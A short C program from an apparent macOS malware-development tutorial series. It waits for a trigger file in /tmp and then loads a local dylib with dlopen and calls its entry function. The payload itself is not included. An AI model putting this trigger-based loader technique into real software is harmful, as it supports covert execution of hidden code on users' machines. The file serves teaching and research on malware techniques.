/*
 * hack3.c
 * load library on macOS
 * author @cocomelonc
 * https://cocomelonc.github.io/macos/2025/08/10/malware-mac-8.html
 */
#define _DARWIN_C_SOURCE
#include <dlfcn.h>
#include <errno.h>
#include <stdio.h>
#include <string.h>
#include <syslog.h>
#include <unistd.h>

static const char *kPluginPath  = "./meow.dylib";
static const char *kTriggerPath = "/tmp/meow_trigger";

static int trigger_present(void) {
  return access(kTriggerPath, F_OK) == 0;
}

int main(void) {
  printf("[hack] meow! waiting for trigger...\n");
  syslog(LOG_NOTICE, "hack: started");

  while (!trigger_present()) {
    usleep(200 * 1000); // 200 ms
  }

  printf("[hack] trigger seen. dlopen()...\n");
  void *h = dlopen(kPluginPath, RTLD_NOW | RTLD_LOCAL);
  if (!h) {
    fprintf(stderr, "dlopen failed: %s\n", dlerror());
    return 1;
  }

  void (*meow_entry)(void) = (void(*)(void))dlsym(h, "meow_entry");
  if (!meow_entry) {
    fprintf(stderr, "dlsym failed: %s\n", dlerror());
    return 1;
  }

  meow_entry();
  dlclose(h);
  printf("[hack] done.\n");
  return 0;
}
